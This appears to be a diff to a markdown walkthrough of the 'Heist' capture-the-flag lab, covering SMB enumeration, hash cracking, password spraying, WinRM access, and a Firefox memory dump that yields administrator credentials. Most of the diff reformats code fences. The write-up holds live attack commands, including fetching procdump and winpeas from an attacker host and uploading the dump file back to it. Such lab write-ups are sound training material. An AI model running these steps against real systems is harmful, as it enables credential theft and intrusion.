@@ -5,7 +5,6 @@ tags:
   - OSCPpath
   - processdump
 ---
-
 ## Intro
 
 ![](MediaFiles/Pasted%20image%2020260313211250.png)
@@ -20,18 +19,17 @@ Tools used:
 -----
 # Reconnaissance
 
-
-```
+```shell
 echo '10.129.96.157 heist.htb' | sudo tee -a /etc/hosts
 ```
 
 
 ## Identify open TCP ports fast
-```
+```shell
 sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  heist.htb
 ```
 
-```
+```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 19:15 UTC
 Nmap scan report for heist.htb (10.129.96.157)
 Host is up (0.076s latency).
@@ -49,11 +47,11 @@ Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
 According to these open ports, like port 88 for example its clear that the target is a DC
 
 ### Scan specific open TCP ports
-```
+```shell
 sudo nmap -p80,135,445,5985,49669 -A heist.htb
 ```
 
-```
+```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 19:16 UTC
 Nmap scan report for heist.htb (10.129.96.157)
 Host is up (0.048s latency).
@@ -112,7 +110,7 @@ Nmap done: 1 IP address (1 host up) scanned in 103.13 seconds
 rpcclient -U "" -N heist.htb
 ```
 also via oneliner
-```
+```shell
 rpcclient -U "" -N target -c "enumdomusers"
 ```
 was not successful
@@ -123,16 +121,16 @@ was not successful
 ### Anonymous
 
 #### General info
-```
+```shell
 nxc smb heist.htb
 ```
 
-```                                                                           
+```shell
 SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
 ```
 
 #### Shares
-```
+```shell
 nxc smb heist.htb  -u '' -p '' --shares
 ```
 was not successful
@@ -140,7 +138,7 @@ was not successful
 ### Guest
 
 #### Shares
-```
+```shell
 nxc smb heist.htb -u 'guest' -p '' --shares
 ```
 was not successful
@@ -154,7 +152,7 @@ i can login as guest instead, and then i am redirected to `/issues.php`, then op
 
 #### File found
 it appears to be a cisco router configuration
-```
+```shell
 version 12.2
 no service pad
 service password-encryption
@@ -220,11 +218,11 @@ Hazard
 and on the webpage this user tells the admin to create an account for him on the windows server
 ## Cracking MD5 hash
 
-```
+```shell
 hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 cracked successfully
-```
+```shell
 $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent              
                                                           
 Session..........: hashcat
@@ -328,11 +326,11 @@ this user can connect towards `SMB, RPC`
 
 ## SMB enum as hazard
 
-```
+```shell
 nxc smb heist.htb -u hazard -p stealth1agent --shares
 ```
 
-```
+```shell
 SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
 SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
 SMB         10.129.96.157   445    SUPPORTDESK      [*] Enumerated shares
@@ -345,27 +343,27 @@ SMB         10.129.96.157   445    SUPPORTDESK      IPC$            READ        
 
 ### Downloading SMB shares
 
-```
+```shell
 nxc smb heist.htb -u hazard -p stealth1agent --spider C$
 nxc smb heist.htb -u hazard -p stealth1agent --spider ADMIN$
 nxc smb heist.htb -u hazard -p stealth1agent --spider IPC$
 ```
 
-```
+```shell
 nxc smb heist.htb -u 'hazard' -p 'stealth1agent' -M spider_plus -o DOWNLOAD_FLAG=True
 
 nxc smb heist.htb -u 'hazard' -p 'stealth1agent' -M spider_plus
 ```
 
-```
+```shell
 smbclient -L heist.htb -U hazard%stealth1agent
 ```
 
-```
+```shell
 smbclient //heist.htb/IPC$ -U hazard%stealth1agent
 ```
 
-```
+```shell
 └─$ smbclient //heist.htb/IPC$ -U hazard%'stealth1agent'                                                                   
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -373,17 +371,17 @@ NT_STATUS_NO_SUCH_FILE listing \*
 
 ```
 
-```
+```shell
 nxc smb heist.htb -u 'hazard' -p 'stealth1agent' --spider Share_name --regex .
 ```
 
 ## RPC enum as user hazard
 
-```
+```shell
 rpcclient -U 'hazard%stealth1agent' heist.htb
 ```
 
-```
+```shell
 └─$ rpcclient -U 'hazard%stealth1agent' heist.htb                                                                          
 rpcclient $> enumdomgroups
 result was NT_STATUS_CONNECTION_DISCONNECTED
@@ -399,7 +397,7 @@ cant run commands
 ## Finding valid users
 ### RID brute force
 
-```
+```shell
 nxc smb heist.htb -u 'hazard' -p 'stealth1agent' --rid-brute
 ```
 
@@ -417,7 +415,7 @@ SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (Sid
 SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
 ```
 now lets update our list of users with the ones we found here and try all combinations again with the password we have gathered
-```
+```shell
 nxc winrm heist.htb -u users.txt -p passwords.txt
 ```
 
@@ -460,12 +458,11 @@ Q4)sJu\Y8qz*A3?d
 ## WinRM as user (chase)
 
 logged in and grabbed user flag
-```
+```shell
 evil-winrm -i heist.htb -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
 ```
 
-```
-                                        
+```powershell
 Evil-WinRM shell v3.7
                                         
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -486,7 +483,7 @@ supportdesk\chase
 
 ## Privileges
 
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Chase\Desktop> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -502,35 +499,27 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ## winpeas
 
-```
+```shell
 python3 -m http.server 8001
 ```
 
-```
+```shell
 powershell wget http://10.10.15.0:8001/winpeas.bat -o winpeas.bat
 ```
 
-```
+```shell
 .\winpeas.bat
 ```
 
 in winpeas, this stood out to me
+```shell
+\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\places.sqlite
 ```
-\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\places.sqlite      
-```
-
-i also see this
-```
-=========|| Additonal Winlogon Credentials Check  
-.  
-Administrator
-```
-which means that the **Administrator** account is currently logged onto the machine:
 
 ## Filesystem enum
 
 found a todo file
-```
+```powershell
 *Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
 Stuff to-do:
 1. Keep checking the issues list.
@@ -541,7 +530,7 @@ Done:
 ```
 
 then i also remembered, to check the webapps directory, and started with `/issues.php`
-```
+```powershell
 *Evil-WinRM* PS C:\inetpub\wwwroot> type issues.php
 ```
 inside the php file i found this
@@ -586,7 +575,7 @@ thats some usefull info!
 ps
 ```
 from the processes shown, i found firefox running and it stood out to me
-```
+```powershell
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 -------  ------    -----      -----     ------     --  -- -----------
 1495      58    23684      78256              4308   1 explorer
@@ -598,39 +587,37 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ```
 
 lets use procdump, upload it directly via evil-winrm
-```
+```powershell
 upload '/home/ch3ckm8/Desktop/procdump64.exe'
 ```
 or manually
 
 
-```
+```powershell
 python3 -m http.server 8001
 ```
 
-```
+```powershell
 powershell wget http://10.10.15.0:8001/procdump64.exe -o procdump64.exe
 ```
 but before using it, lets view the pids of the firefox processes
-```
+```powershell
 ps | findstr firefox
 ```
 the pid is the 3rd column from the right
-```
-
-   1075      70   147484     223852       3.38   6352   1 firefox
-    347      19    10220      38732       0.05   6460   1 firefox
-    401      33    31172      88920       0.41   6584   1 firefox
-    378      28    21816      58532       0.20   6828   1 firefox
-    355      25    16440      38980       0.05   7112   1 firefox
-
+```powershell
+1075      70   147484     223852       3.38   6352   1 firefox
+347      19    10220      38732       0.05   6460   1 firefox
+401      33    31172      88920       0.41   6584   1 firefox
+378      28    21816      58532       0.20   6828   1 firefox
+355      25    16440      38980       0.05   7112   1 firefox
 ```
 now run for one of those pids:
-```
+```powershell
 .\procdump64.exe -accepteula -ma 6460
 ```
 
-```
+```powershell
 ProcDump v11.1 - Sysinternals process dump utility                            
 Copyright (C) 2009-2025 Mark Russinovich and Andrew Richards                  
 Sysinternals - www.sysinternals.com                                                                                                                         
@@ -642,7 +629,7 @@ Sysinternals - www.sysinternals.com
 ```
 
 download the `.dmp` file directly from winrm
-```
+```powershell
 download 'C:\Users\Chase\firefox.exe_260314_020746.dmp'
 ```
 or transfer from windows target towards attacker:
@@ -655,34 +642,26 @@ attacker
 python3 -m uploadserver 8001
 ```
 target
-```
+```powershell
 iwr -Uri http://10.10.15.0:8001/upload -Method Post -InFile firefox.exe_260314_020746.dmp
 ```
 or
-```
+```powershell
 impacket-smbserver share . -smb2support
 ```
 
-```
+```powershell
 copy 'C:\Users\Chase\firefox.exe_260314_020746.dmp' \\10.10.15.0\share\
 ```
 
 ### Inspecting the DMP file
 
-```
-file firefox.exe_260314_020746.dmp
-```
-
-```
-
-```
-
 lets search for strings with keyword `admin`
-```
+```powershell
 strings firefox.exe_230623_015925.dmp | grep admin
 ```
 
-```
+```powershell
 └─$ strings firefox.exe_260314_020746.dmp | grep login_password                                                                                                                                                                                                                                                             
 MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
 RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
@@ -696,20 +675,20 @@ administrator
 
 ### WinRM as administrator
 
-```
+```powershell
 evil-winrm -i heist.htb -u 'administrator' -p '4dD!5}x/re8]FBuZ'
 ```
 
 in cmd
-```
+```powershell
 echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
 ```
 or in powershell (comma separated)
-```
+```powershell
 echo "User: $env:USERNAME"; echo "Hostname: $env:COMPUTERNAME"; whoami; ipconfig /all; type "C:\Users\Administrator\Desktop\root.txt"
 ```
 
-```
+```powershell
 User: Administrator
 Hostname: SUPPORTDESK
 supportdesk\administrator
@@ -749,7 +728,6 @@ Ethernet adapter Ethernet0 2:
    Connection-specific DNS Suffix Search List :
                                        htb
 e01988779ad34fc43519dc971b3a9b6b
-
 ```
 
 ---
@@ -770,7 +748,6 @@ e01988779ad34fc43519dc971b3a9b6b
 8. **Procdump** Firefox PID → memory dump contains plaintext creds in URL args
 9. **WinRM** as Administrator → root flag
 
-
 | #    | inputs                                    | action             | results                      |
 | ---- | ----------------------------------------- | ------------------ | ---------------------------- |
 | 1    | target                                    | nmap               | port 80, port 135, port 445  |
@@ -787,12 +764,9 @@ e01988779ad34fc43519dc971b3a9b6b
 
 ![actions_horizontal](MediaFiles/actions_horizontal.svg)
 
-
-
 -----
 # Sidenotes
 
-
-Highlights here were the process enumeration and the assumption that administrator runs these processes, along with the process dump in order to find admin creds
+The highlights of this one were the process enumeration and the assumption that administrator runs some processes, along with the process dump in order to find admin creds
 
 ![](MediaFiles/Pasted%20image%2020260313230035.png)
